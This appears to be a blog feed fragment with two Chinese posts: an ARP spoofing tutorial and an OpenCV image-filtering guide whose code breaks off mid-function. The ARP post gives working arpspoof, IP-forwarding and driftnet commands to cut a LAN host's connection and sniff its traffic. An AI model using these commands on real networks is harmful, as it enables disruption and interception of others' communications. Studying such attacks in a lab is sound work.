        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-理论"><a class="markdownIt-Anchor" href="#1-理论"></a> 1 理论</h1><h2 id="11-原理"><a class="markdownIt-Anchor" href="#11-原理"></a> 1.1 原理</h2><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-02-18_14-20-42.jpg" width="600" height="400" alt="图片名称" align="center" id="25"><p>ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。假设A、B、C位于<code>同一局域网</code>内，A是PC主机，B是攻击主机，C是路由器。攻击过程如下：</p><ol><li>A将包含目标IP地址(10.0.1.1)信息的ARP Request，广播到网络中的所有主机，源主机A的IP地址和MAC地址都包括在ARP请求中；</li><li>C确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址<a href="https://baike.baidu.com/item/%E6%98%A0%E5%B0%84" target="_blank" rel="noopener">映射</a>添加到本地ARP缓存中；并将包含其MAC地址的ARP回复消息直接发送回主机A；</li><li>当主机A收到从C发来的ARP回复消息时，会用C的IP和MAC地址映射更新ARP缓存；</li><li>攻击主机B向A发送伪造的ARP应答包，在这个伪造的应答包中，IP地址为C的IP地址，而MAC地址为B的MAC地址；</li><li>A在接收到这个应答包后，会刷新它的ARP缓存，这样在A的ARP缓存表中就出现了IP-C与MAC-B的映射；</li><li>攻击主机B向C发送伪造的ARP应答包，在这个伪造的应答包中，IP地址为A的IP地址，而MAC地址为B的MAC地址；</li><li>C在接收到这个应答包后，会刷新它的ARP缓存，这样在C的ARP缓存表中就出现了IP-A与MAC-B的映射。</li></ol><p>这样一来，A与C之间的流量交换都会经过B，可以进行<code>监听、篡改信息、断网攻击</code>。</p><h2 id="12-知识储备"><a class="markdownIt-Anchor" href="#12-知识储备"></a> 1.2 知识储备</h2><ul><li><p><strong>网关</strong>：网关(Gateway)在网络层以上实现网络互连。由于历史的原因，许多有关TCP/IP的文献曾经把网络层使用的路由器称为网关，在今天很多局域网采用路由来接入网络，因此通常指的网关就是路由器的IP！</p></li><li><p><strong>Bridged(桥接模式)</strong>：将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。其网络结构如下图所示：</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/v2-0e29e8f13495c269f3fdc723aa2255c2_r.jpg" width="800" height="600" alt="图片名称" align="center" id="26"></li></ul><h1 id="2-实战"><a class="markdownIt-Anchor" href="#2-实战"></a> 2 实战</h1><h2 id="21-断网攻击"><a class="markdownIt-Anchor" href="#21-断网攻击"></a> 2.1 断网攻击</h2><ol><li><p><strong>准备</strong>：<code>kali</code>虚拟机，设置桥接模式，否则断网无效；</p></li><li><p><strong>查看自己的网卡信息</strong></p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-02-17_22-40-47.jpg" width="600" height="300" alt="图片名称" align="center" id="27"></li><li><p><strong>找到目标IP</strong>：<code>nmap</code>扫描内网(命令<code>nmap -sP 192.168.1.*</code>)或使用安卓端的<code>Net Analyzer</code>进行<code>LAN Scan</code>；</p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-02-17_22-04-15.jpg" width="600" height="300" alt="图片名称" align="center" id="28"></li><li><p><strong>arpspoof进行攻击</strong>：执行下面命令后目的主机无法上网；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 自己网卡信息 -t 目标IP -r 网关</span><br><span class="line">例：arpspoof -i eth0  -t  192.168.1.7 -r 192.168.1.1</span><br></pre></td></tr></table></figure></li></ol><h2 id="22-窃听"><a class="markdownIt-Anchor" href="#22-窃听"></a> 2.2 窃听</h2><ol><li><strong>开启IP转发</strong>：<code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></li><li><strong>arp攻击</strong>：<code>arpspoof -i eth0 -t targetIP -r gateway（具体参考上面）</code></li><li><strong>窃听</strong>：<code>driftnet -i eth0（你的网卡）</code>或<code>wireshark</code></li></ol><h1 id="3-存在问题"><a class="markdownIt-Anchor" href="#3-存在问题"></a> 3 存在问题</h1><ul><li>攻击局域网其他系统时，kali虚拟机可以上网，但是其宿主机(物理机win10)无法上网；<font color="#008000">开启IP转发可以解决</font></li><li>窃听时目标主机虽然可以ping通，当时网速太慢且不稳定；driftnet无法正确抓取图片；</li></ul><h1 id="4-参考"><a class="markdownIt-Anchor" href="#4-参考"></a> 4 参考</h1><ul><li><p><a href="https://baike.baidu.com/item/ARP/609343" target="_blank" rel="noopener">百度百科-ARP</a></p></li><li><p><a href="https://baike.baidu.com/item/ARP%E6%94%BB%E5%87%BB#:~:text=ARP%20%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E6%98%AF%E5%B1%80%E5%9F%9F%E7%BD%91,%E6%AD%A3%E5%B8%B8%E4%B8%8A%E7%BD%91%E5%92%8C%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8%E3%80%82" target="_blank" rel="noopener">百度百科-ARP攻击</a></p></li><li><p><a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97" target="_blank" rel="noopener">百度百科-ARP欺骗</a></p></li><li><p><a href="https://baike.baidu.com/item/%E7%BD%91%E5%85%B3" target="_blank" rel="noopener">百度百科-网关</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/56658358#:~:text=%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%E5%B0%B1%E6%98%AF%E5%B0%86%E4%B8%BB%E6%9C%BA,%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E8%80%8C%E4%B8%8D%E5%B9%B2%E6%89%B0%E3%80%82" target="_blank" rel="noopener">vmware 虚拟机三种网络模式—“桥接、NAT 、仅主机”区别？</a></p></li><li><p><a href="https://blog.csdn.net/weixin_43343144/article/details/102679135" target="_blank" rel="noopener">Kali Linux使用arpspoof命令进行断网攻击（ARP欺骗）【VMware一定要设置桥接模式，否则断网会无效】</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44839457/article/details/108333653?utm_source=app&amp;app_version=4.5.2" target="_blank" rel="noopener">使用kali进行ARP攻击与欺骗</a></p></li><li><p><a href="https://blog.csdn.net/qq_42039946/article/details/112968942?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control" target="_blank" rel="noopener">使用kali进行局域网ARP欺骗攻击与监听</a></p></li><li><p><a href="https://www.youtube.com/watch?v=ko4VvZuO4rs" target="_blank" rel="noopener">秦柯-ARP攻击</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像滤波整理</title>
      <link href="/2020/11/08/%E5%9B%BE%E5%83%8F%E6%BB%A4%E6%B3%A2%E6%95%B4%E7%90%86/"/>
      <url>/2020/11/08/%E5%9B%BE%E5%83%8F%E6%BB%A4%E6%B3%A2%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="图像滤波"><a class="markdownIt-Anchor" href="#图像滤波"></a> 图像滤波</h1><h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2><ol><li><strong>定义</strong>：图像滤波，即在尽量保留图像细节特征的条件下对目标图像的噪声进行抑制，是图像预处理中不可缺少的操作，其处理效果的好坏将直接影响到后续图像处理和分析的有效性和可靠性。</li><li>**比喻：**我们可以把滤波器想象成一个包含加权系数的窗口，当使用这个滤波器平滑处理图像时，就把这个窗口放到图像之上，透过这个窗口来看我们得到的图像。</li><li><strong>公式：</strong> $$O(i, j) = \sum_{m,n}I(i+m,j+n)K(m,n)$$ 其中O(i, j)是像素输出值，I(i+m, j+n)是像素输入值，K为滤波器（核：二维矩阵，核的不同值表示不同的算法。）</li><li><strong>种类</strong>：低通滤波器可以消除噪声、模糊化，高通滤波器可以提取边缘。<a href="https://blog.csdn.net/u013631121/article/details/80444602?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">白话文讲计算机视觉-第三讲-滤波器</a></li><li><strong>作用</strong>：图像滤波可以更改或者增强图像。通过滤波，可以强调一些特征或者去除图像中一些不需要的部分。滤波是一个邻域操作算子，利用给定像素周围的像素的值决定此像素的最终的输出值。常见的应用包括去噪、图像增强、检测边缘、检测角点、模板匹配等。</li></ol><h2 id="非学习类型算法"><a class="markdownIt-Anchor" href="#非学习类型算法"></a> 非学习类型算法</h2><h3 id="0x01-均值滤波"><a class="markdownIt-Anchor" href="#0x01-均值滤波"></a> 0x01 均值滤波</h3><ol><li><strong>定义</strong>：用其像素点周围像素的平均值代替元像素值，在滤除噪声的同时也会滤掉图像的边缘信息。</li><li><strong>代码</strong>：Python调用OpenCV实现均值滤波的核心函数：<strong>result = cv2.blur(原始图像,  核大小)</strong>   其中，核大小是以（宽度，高度）表示的元组形式，常见的形式包括：核大小（3，3）和（5，5）。<strong>boxFilter</strong>也可实现。</li></ol><h3 id="0x02-方框滤波"><a class="markdownIt-Anchor" href="#0x02-方框滤波"></a> 0x02 方框滤波</h3><ol><li><strong>定义</strong>：方框滤波和均值滤波核基本一致，区别是需不需要均一化处理。</li><li><strong>代码</strong>： OpenCV调用boxFilter()函数实现方框滤波。函数：<strong>result = cv2.boxFilter(原始图像, 目标图像深度, 核大小, normalize属性)</strong>  其中，目标图像深度是int类型，通常用“-1”表示与原始图像一致；核大小主要包括（3，3）和（5，5）；normalize属性表示是否对目标图像进行归一化处理，当normalize为true时需要执行均值化处理，当normalize为false时，不进行均值化处理，实际上为求周围各像素的和，很容易发生溢出，溢出时均为白色，对应像素值为255。</li></ol><h3 id="0x03-中值滤波"><a class="markdownIt-Anchor" href="#0x03-中值滤波"></a> <strong>0x03 中值滤波</strong></h3><ol><li>**定义：**中值滤波用测试像素周围邻域像素集中的中值代替原像素。中值滤波去除椒盐噪声和斑块噪声时，效果非常明显。在OpenCV中，可以使用函数medianBlur进行操作。</li><li><strong>代码</strong>： OpenCV主要调用medianBlur()函数实现中值滤波。图像平滑里中值滤波的效果最好。<strong>dst = cv2.medianBlur(src, ksize)</strong>   其中，src表示源文件，ksize表示核大小。核必须是大于1的奇数，如3、5、7等。</li></ol><h3 id="0x04-高斯滤波"><a class="markdownIt-Anchor" href="#0x04-高斯滤波"></a> 0x04 高斯滤波</h3><ol><li><strong>定义</strong>：加权平均，距离越近的点权重越大，距离越远的点权重越小。由于图像是二维矩阵，则采用二维高斯函数(正态分布)$$f(x,y)= \frac{1}{2πσ^2} e<sup>{\frac{-(x</sup>2+y<sup>2)}{2σ</sup>2}}$$ 。如果原图是彩色图片，可以对RGB三个通道分别做高斯模糊。参考：<a href="https://blog.csdn.net/nima1994/article/details/79776802" target="_blank" rel="noopener">高斯模糊（高斯滤波）的原理与算法</a></li><li><strong>边界处理</strong>：把已有的点拷贝到另一面的对应位置，模拟出完整的矩阵。</li><li><strong>公式</strong>：以 q为中心的窗口中，某一点 p在高斯滤波过程中。 权重(空间)： $$G§ = \frac{1}{2πσ^2} e<sup>{\frac{-||p-q||</sup>2}{2σ^2}}$$</li><li><strong>代码</strong>：Python中OpenCV主要调用GaussianBlur函数：<strong>dst = cv2.GaussianBlur(src, ksize, sigmaX)</strong>   其中，src表示原始图像；ksize表示核大小，核大小（N, N）必须是奇数；sigmaX表示X方向方差，主要控制权重，sigmaX小，表现在高斯曲线上就是曲线越高越尖，表现在滤波效果上就是模糊程度小（sigmaX大，表现在高斯曲线上就是曲线越矮越平缓，表现在滤波效果上就是模糊程度大）。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#导入库</span></span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取图片</span></span><br><span class="line">img = cv2.imread(<span class="string">'02.png'</span>)</span><br><span class="line">source = cv2.cvtColor(img,cv2.COLOR_BGR2RGB)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#方框滤波</span></span><br><span class="line">img_box = cv2.boxFilter(source, <span class="number">-1</span>, (<span class="number">5</span>,<span class="number">5</span>), normalize=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 均值滤波</span></span><br><span class="line">img_blur = cv2.blur(source, (<span class="number">5</span>,<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#中值滤波</span></span><br><span class="line">img_median = cv2.medianBlur(source, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯滤波</span></span><br><span class="line">img_Guassian = cv2.GaussianBlur(source, (<span class="number">5</span>,<span class="number">5</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示图形</span></span><br><span class="line">titles = [<span class="string">'Source Image'</span>, <span class="string">'BoxFilter Image'</span>, <span class="string">'Blur Image'</span>, </span><br><span class="line">         <span class="string">'Median Image'</span>, <span class="string">'Guassian Image'</span>]  </span><br><span class="line">images = [source, img_box, img_blur, img_Guassian, img_median]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):  </span><br><span class="line">   plt.subplot(<span class="number">2</span>, <span class="number">3</span>, i+<span class="number">1</span>), plt.imshow(images[i], <span class="string">'gray'</span>)  </span><br><span class="line">   plt.title(titles[i])  </span><br><span class="line">   plt.xticks([]),plt.yticks([])  </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/Eastmount/article/details/82216380?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">我跳</a></p><h3 id="0x05-双边滤波-边缘保护滤波"><a class="markdownIt-Anchor" href="#0x05-双边滤波-边缘保护滤波"></a> 0x05 双边滤波 –  <strong>边缘保护滤波</strong></h3><ol><li><strong>定义</strong>：高斯滤波只考虑了周边点与中心点的空间距离来计算得到权重，会模糊掉边缘。在高斯滤波的基础上加入了像素值(灰度)权重项，也就是说既要考虑距离因素，也要考虑像素值差异的影响，像素值越相近，权重越大。参考：<a href="http://www.360doc.com/content/17/0306/14/28838452_634420847.shtml" target="_blank" rel="noopener">双边滤波详解</a>、<a href="https://blog.csdn.net/u013921430/article/details/84532068" target="_blank" rel="noopener">【图像处理】——双边滤波</a></li><li><strong>公式：</strong> 像素值权重     $$G_r= exp(-{\frac{||I_p-I_q||<sup>2}{2σ</sup>2_r}})$$  空间距离权重  $$G_s= exp(-{\frac{||p-q||<sup>2}{2σ</sup>2_s}})$$  滤波窗口内每个像素值的权重和 $$W(q) = \sum_{p\in S} G_s§G_r§$$ —用于权重的归一化 滤波结果： $$BF = \frac {1}{W_q}\sum_{p\in S} G_s§G_r§*I_p$$</li><li><strong>代码</strong>：OpenCV在Python中双边滤波函数是**cv2.bilateralFilter(src, d, sigmaColor, sigmaSpace）**时间复杂度 $$O(Nr^2)$$  <strong>① s</strong>rc是输入图像； ② d是在过滤期间使用的每个像素邻域的直径，如果输入d非0，则sigmaSpace由d计算得出，如果sigmaColor没输入，则sigmaColor由sigmaSpace计算得出； ③ sigmaColor是灰度值相似性高斯函数标准差，色彩空间的标准方差，一般尽可能大， 较大的参数值意味着像素邻域内较远的颜色会混合在一起， 从而产生更大面积的半相等颜色； ④ sigmaSpace是空间高斯函数标准差，坐标空间的标准方差(像素单位)，一般尽可能小。 参数值越大意味着只要它们的颜色足够接近，越远的像素都会相互影响。 当d &gt; 0时，它指定邻域大小而不考虑sigmaSpace。 否则，d与sigmaSpace成正比。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#导入库</span></span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取图片</span></span><br><span class="line">img = cv2.imread(<span class="string">'02.png'</span>)</span><br><span class="line">source = cv2.cvtColor(img,cv2.COLOR_BGR2RGB)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#双边滤波</span></span><br><span class="line">img_bilateral = cv2.bilateralFilter(source, <span class="number">7</span>, <span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示图形</span></span><br><span class="line">titles = [<span class="string">'Source Image'</span>, <span class="string">'bilateralFilter Image'</span>]  </span><br><span class="line">images = [source, img_bilateral]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):  </span><br><span class="line">   plt.subplot(<span class="number">1</span>, <span class="number">2</span>, i+<span class="number">1</span>), plt.imshow(images[i], <span class="string">'gray'</span>)  </span><br><span class="line">   plt.title(titles[i])  </span><br><span class="line">   plt.xticks([]),plt.yticks([]) <span class="comment">#禁止输出坐标轴 </span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="0x06-引导滤波-边缘保护滤波"><a class="markdownIt-Anchor" href="#0x06-引导滤波-边缘保护滤波"></a> 0x06  引导滤波 – <strong>边缘保护滤波</strong></h3><h4 id="1-定义"><a class="markdownIt-Anchor" href="#1-定义"></a> <strong>1. 定义</strong></h4><p>引导滤波的思想用一张引导图像产生权重，从而对输入图像进行处理。引导滤波除了可以用于图像平滑，还可以用于HDR压缩、细节增强、图像去雾、联合上采样等图像处理任务。引导滤波中空间域的贡献自然取决于窗口的大小，即由参数 r 决定。而标准差则是评判颜色差异性的参数，窗口中标准差越大，说明局部的像素相似性越差。</p><h4 id="2-公式图像处理引导滤波"><a class="markdownIt-Anchor" href="#2-公式图像处理引导滤波"></a> <strong>2. 公式：</strong><a href="https://blog.csdn.net/u013921430/article/details/99695647" target="_blank" rel="noopener">【图像处理】引导滤波</a></h4><ol><li><strong>权重</strong> $$W_{ij}(i,j) = \frac{1}{|ω|^2} \sum_{k:(i,j)\in ω_k} (1+ \frac{(I_i-μ_k)(I_j-μ_k)}{σ_k^2+ϵ})$$   (局部窗口 $$ω_k$$ ；ϵ是 $$L_2$$ 范数正则化系数，防止$$a_k$$ 过大； $$μ_k$$与 $$ σ_k$$ 表示 $$ I_i$$ 在窗口内的均值、标准差； $$∣w∣$$ 表示窗口内像素块的总数 )</li><li><strong>结果</strong> $$q_i = \sum_{j}{W_{ij}(I)*p_j}$$   (q、I、p分表表示输出图像、引导图像和输入图像 ，i、j 分别表示图像中像素点的索引。权重 W 仅与引导图像 I 有关，而在双边滤波中权重 W 由输入图像自身决定。)</li></ol><h4 id="3-代码1引导滤波"><a class="markdownIt-Anchor" href="#3-代码1引导滤波"></a> <strong>3. 代码1(引导滤波)</strong>：</h4><p>第一个代码块是手写实现引导滤波。时间复杂度O(N)，当 r 与 ϵ 越大，图像被平滑的程度越大。伪代码中：r是窗口半径， $$f_{mean}(I,r)$$​ 表示在(r, r)窗口对图像做均值滤波。大佬博客：<a href="https://blog.csdn.net/u013921430/article/details/99695647" target="_blank" rel="noopener">我跳</a><br>　　第二个代码块是使用的现有库。参考：<a href="https://jinzhangyu.github.io/2018/09/06/2018-09-06-OpenCV-Python%E6%95%99%E7%A8%8B-16-%E5%B9%B3%E6%BB%91%E5%9B%BE%E5%83%8F-3/" target="_blank" rel="noopener">我跳</a></p><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/GF.png" width="500" height="400" alt="图片名称" align="center" id="23"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: 不用先生</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">input_fn = <span class="string">'03.png'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数名：my_guidedFilter_oneChannel</span></span><br><span class="line"><span class="comment"># 函数功能：用于单通道图像（灰度图）的引导滤波函数；</span></span><br><span class="line"><span class="comment"># 参数：srcImg：输入图像，为单通道图像；</span></span><br><span class="line"><span class="comment"># 参数：guideImg：引导图像，为单通道图像，尺寸与输入图像一致；</span></span><br><span class="line"><span class="comment"># 参数：rad：滤波器大小r，应该保证为奇数，默认值为9；</span></span><br><span class="line"><span class="comment"># 参数：eps：防止a过大的正则化参数ϵ，</span></span><br><span class="line"><span class="comment"># 返回：dstImg：输出图像，尺寸、通道数与输入图像吻合；</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_guidedFilter_oneChannel</span><span class="params">(srcImg, guidedImg, rad=<span class="number">13</span>, eps=<span class="number">0.1</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换数值类型，并归一化</span></span><br><span class="line">    srcImg = srcImg/<span class="number">255.0</span></span><br><span class="line">    guidedImg = guidedImg/<span class="number">255.0</span></span><br><span class="line">    img_shape = np.shape(srcImg)<span class="comment">#查看矩阵或者数组的维数。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在(rad, rad)窗口的内对图像做均值滤波。</span></span><br><span class="line">    P_mean = cv2.boxFilter(srcImg, <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment"># p的均值平滑</span></span><br><span class="line">    I_mean = cv2.boxFilter(guidedImg,<span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment"># I的均值平滑</span></span><br><span class="line"></span><br><span class="line">    I_square_mean = cv2.boxFilter(np.multiply(guidedImg, guidedImg), <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment">#I*I的均值平滑</span></span><br><span class="line">    I_mul_P_mean = cv2.boxFilter(np.multiply(srcImg, guidedImg), <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>)<span class="comment"># I*p的均值平滑</span></span><br><span class="line">    </span><br><span class="line">    var_I = I_square_mean-np.multiply(I_mean,I_mean)<span class="comment"># 方差</span></span><br><span class="line">    cov_I_P = I_mul_P_mean-np.multiply(I_mean,P_mean)<span class="comment"># 协方差</span></span><br><span class="line">    </span><br><span class="line">    a = cov_I_P/(var_I+eps)<span class="comment"># 相关因子a</span></span><br><span class="line">    b = P_mean-np.multiply(a,I_mean)<span class="comment"># 相关因子b</span></span><br><span class="line">    </span><br><span class="line">    a_mean = cv2.boxFilter(a, <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment"># 对a进行均值平滑</span></span><br><span class="line">    b_mean = cv2.boxFilter(b, <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>)  <span class="comment"># 对b进行均值平滑</span></span><br><span class="line">    </span><br><span class="line">    dstImg = np.multiply(a_mean,guidedImg)+b_mean</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> dstImg*<span class="number">255.0</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 函数名：my_guidedFilter_threeChannel</span></span><br><span class="line"><span class="comment"># 函数功能：用于三通道图像（RGB彩色图）的引导滤波函数；</span></span><br><span class="line"><span class="comment"># 参数：srcImg：输入图像，为三通道图像；</span></span><br><span class="line"><span class="comment"># 参数：guideImg：引导图像，为三通道图像，尺寸与输入图像一致；</span></span><br><span class="line"><span class="comment"># 参数：rad：滤波器大小r，应该保证为奇数，默认值为9；</span></span><br><span class="line"><span class="comment"># 参数：eps：防止a过大的正则化参数ϵ，</span></span><br><span class="line"><span class="comment"># 返回：dstImg：输出图像，尺寸、通道数与输入图像吻合；</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_guidedFilter_threeChannel</span><span class="params">(srcImg, guidedImg, rad=<span class="number">9</span>, eps=<span class="number">0.01</span>)</span>:</span></span><br><span class="line">    </span><br><span class="line">    img_shape = np.shape(srcImg)</span><br><span class="line"></span><br><span class="line">    dstImg = np.zeros(img_shape, dtype=float)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> range(<span class="number">0</span>,img_shape[<span class="number">2</span>]):</span><br><span class="line">        dstImg[:,:,ind] = my_guidedFilter_oneChannel(srcImg[:,:,ind],</span><br><span class="line">              guidedImg[:,:,ind], rad, eps)</span><br><span class="line">    </span><br><span class="line">    dstImg = dstImg.astype(np.uint8)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> dstImg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span 